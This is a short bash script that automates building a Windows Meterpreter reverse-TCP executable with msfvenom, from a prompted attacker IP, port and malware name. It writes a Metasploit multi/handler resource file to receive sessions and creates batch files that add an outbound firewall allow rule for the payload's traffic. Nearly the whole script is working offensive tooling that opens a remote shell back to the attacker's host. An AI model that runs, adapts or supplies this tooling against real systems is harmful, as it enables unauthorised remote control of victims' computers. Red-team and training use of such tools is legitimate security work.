#!/bin/bash

echo "---- Scrubbing all setups, starting fresh ----"
rm -rf *.exe sethandle.rc *.bat 
echo ""

read -p 'TARGET IP = ' rhost_ip
read -p 'TARGET PORT = ' rhost_port
read -p 'YOUR IP = ' lhost_ip
read -p 'YOUR PORT = ' lhost_port
read -p 'Malware Name = ' mal_name

echo ""
echo " ----- CASCADING ------ "
echo ""
echo "...Designing Reverse TCP Malware..."
echo ""
msfvenom --platform windows --arch x86 --format exe --encoder generic/none --payload windows/meterpreter/reverse_tcp LHOST=$lhost_ip LPORT=$lhost_port > $mal_name.exe 

echo ""
echo "...Now Setting Up Handler..."
echo ""
echo use exploit/multi/handler >> sethandle.rc
echo set payload windows/meterpreter/reverse_tcp >> sethandle.rc
echo set LHOST $lhost_ip >> sethandle.rc
echo set LPORT $lhost_port >> sethandle.rc
echo set exitonsession false >> sethandle.rc
echo exploit -j >> sethandle.rc

echo ""
echo "...Creating batch file for Firewall..."
echo ""
echo netsh advfirewall set all profiles state on >> firewall.bat
echo netsh advfirewall firewall add rule name "ScoreSystem" dir=out action=allow protocol=TCP localport=$rhost_port >> $mal_name.bat

echo "...Firewall configuration for malware completed..."
echo ""
echo ""
